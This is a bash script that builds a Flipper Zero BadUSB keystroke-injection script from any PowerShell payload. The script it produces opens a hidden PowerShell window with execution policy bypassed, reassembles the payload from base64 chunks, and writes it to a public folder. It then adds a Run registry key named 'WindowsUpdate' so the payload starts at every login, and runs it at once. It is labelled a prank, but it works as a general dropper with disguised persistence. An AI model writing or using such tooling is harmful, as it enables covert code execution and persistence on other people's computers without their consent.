#!/usr/bin/env bash
# gen_prank_startup.sh - generate chunked Flipper BadUSB script from a PS1 payload
# Embeds PS1 as base64 chunks, writes to disk, adds startup registry key, runs immediately
# Usage: ./gen_prank_startup.sh [ps1_file] [chunk_size] > output.txt

set -euo pipefail

PS1_FILE="${1:-prank_startup.ps1}"
CHUNK_SIZE="${2:-200}"
PERSIST_NAME="WindowsUpdate"
PERSIST_PATH='C:\Users\Public\wp.ps1'

if [ ! -f "$PS1_FILE" ]; then
    echo "Error: $PS1_FILE not found" >&2
    exit 1
fi

B64=$(base64 -w 0 "$PS1_FILE")
TOTAL=${#B64}

cat <<HEADER
REM Prank wallpaper — chunk+run with startup persistence
REM PS1: $(basename "$PS1_FILE") | b64 chars: ${TOTAL} | chunk size: ${CHUNK_SIZE}
DELAY 2000
GUI r
DELAY 800
STRING powershell -ep bypass -w hidden
ENTER
DELAY 1000
STRING \$d = ""
ENTER
HEADER

offset=0
while [ $offset -lt $TOTAL ]; do
    chunk="${B64:$offset:$CHUNK_SIZE}"
    echo "STRING \$d += \"$chunk\""
    echo "ENTER"
    offset=$((offset + CHUNK_SIZE))
done

cat <<FOOTER
STRING \$b = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\$d)); \$f = '${PERSIST_PATH}'; [IO.File]::WriteAllText(\$f, \$b); Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name '${PERSIST_NAME}' -Value ('powershell -ep bypass -w hidden -f ' + \$f); & \$f
ENTER
FOOTER
